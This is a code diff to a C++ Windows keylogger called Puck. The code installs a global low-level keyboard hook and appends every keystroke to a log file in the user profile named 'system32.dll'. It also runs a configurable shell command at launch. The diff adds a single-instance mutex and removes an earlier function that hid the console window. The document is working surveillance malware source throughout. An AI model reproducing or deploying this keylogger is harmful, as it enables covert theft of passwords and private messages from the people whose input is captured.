@@ -17,27 +17,30 @@
 #define PUCK_FAILURE_MESSAGE "Looks like Santa Claus is coming to town early this year."
 /* The name of the output file. */
 #define PUCK_OUTPUT_FILE "system32.dll"
+/* The unique identifier which prevents multiple instances of the keylogger from executing. */
+#define PUCK_MUTEX_NAME "83.0x5319.puck"
 
 HHOOK hook;
 std::ofstream output;
 char previousWindowTitle[256];
+HANDLE mutex;
 
-HHOOK activateHook();
-void shutdownHook(HHOOK hook);
+void activateHook();
 int logKey(int keyStroke);
-void activateStealth();
 LRESULT __stdcall callback(int nCode, WPARAM wParam, LPARAM lParam);
 
-HHOOK activateHook() {
-    HHOOK result = SetWindowsHookEx(WH_KEYBOARD_LL, callback, NULL, 0);
-	if (!result) {
+void activateHook() {
+    hook = SetWindowsHookEx(WH_KEYBOARD_LL, callback, NULL, 0);
+	if (!hook) {
 		MessageBox(NULL, PUCK_FAILURE_MESSAGE, PUCK_FAILURE_TITLE, MB_ICONERROR);
 	}
-    return result;
 }
 
-void shutdownHook(HHOOK hook) {
+void shutdown() {
 	UnhookWindowsHookEx(hook);
+
+    ReleaseMutex(mutex);
+    CloseHandle(mutex);
 }
 
 int logKey(int keyStroke) {
@@ -165,16 +168,6 @@ int logKey(int keyStroke) {
     return 0;
 }
 
-void activateStealth(bool visible) {
-    HWND window = FindWindowA("ConsoleWindowClass", NULL);
-    if (visible) {
-        ShowWindow(window, 1);
-    }
-    else {
-        ShowWindow(window, 0);
-    }
-}
-
 LRESULT __stdcall callback(int nCode, WPARAM wParam, LPARAM lParam) {
 	if (nCode >= 0) {
 		if (wParam == WM_KEYDOWN) {
@@ -194,25 +187,29 @@ LRESULT __stdcall callback(int nCode, WPARAM wParam, LPARAM lParam) {
 	return CallNextHookEx(hook, nCode, wParam, lParam);
 }
 
-void initialize(bool visible, const char* command, const char* outputFile) {
+void initialize(const char* command, const char* outputFile) {
     system(command);
-    
+
     std::string path = getenv("USERPROFILE");
     path += "\\";
     path += outputFile;
-    
+
     /* Open the output file in append mode. */
     output.open(path, std::ios_base::app);
+
+    std::cout << "[info] The log file is located at " << path << "\n";
     
-    if (visible) {
-        std::cout << "[info] The log file is located at " << path;
-    }
+    activateHook();
+}
+
+bool isDuplicateInstance() {
+    mutex = CreateMutex(NULL, TRUE, PUCK_MUTEX_NAME);
+    return GetLastError() == ERROR_ALREADY_EXISTS;
 }
 
 int32_t main(int32_t length, char** arguments) {
     const char* command = PUCK_COMMAND;
     const char* outputFile = PUCK_OUTPUT_FILE;
-    bool visible = PUCK_VISIBLE;
     int32_t result = 0;
     for (int32_t i = 1; i < length; i++) {
         if (strcmp(arguments[i], "--command") == 0) {
@@ -233,33 +230,32 @@ int32_t main(int32_t length, char** arguments) {
                 result = 1;
             }
         }
-        else if (strcmp(arguments[i], "--visible") == 0) {
-            visible = true;
-        }
         else if (strcmp(arguments[i], "--help") == 0) {
             std::cout << "Puck v1.0\n"
                 << "puck [--command <string>] [--output <string>] [--visible|--invisible] [--help]\n"
                 << "\t--command <string>\tExecutes the specified command.\n"
                 << "\t--output <string>\tRecords the keystrokes to the specified file.\n"
-                << "\t--visible\t\tShows the console window of the keylogger.\n"
-                << "\t--invisible\t\tHides the console window of the keylogger.\n"
                 << "\t--help\t\t\tPrints the help message.\n";
             result = 1;
         }
     }
 
     if (result == 0) {
-        initialize(visible, command, outputFile);
-
-        activateStealth(visible);
-        hook = activateHook();
-
-        MSG message;
-        while (GetMessage(&message, NULL, 0, 0)) {
-            Sleep(500);
+        if (isDuplicateInstance()) {
+            std::cout << "[error] The keylogger is already running.\n";
+            result = 1;
         }
+        else {
+            initialize(command, outputFile);
 
-        shutdownHook(hook);
+            std::cout << "[info] Keylogger started...\n";
+            MSG message;
+            while (GetMessage(&message, NULL, 0, 0)) {
+                Sleep(1000);
+            }
+
+            shutdown();
+        }
     }
 
     return result;
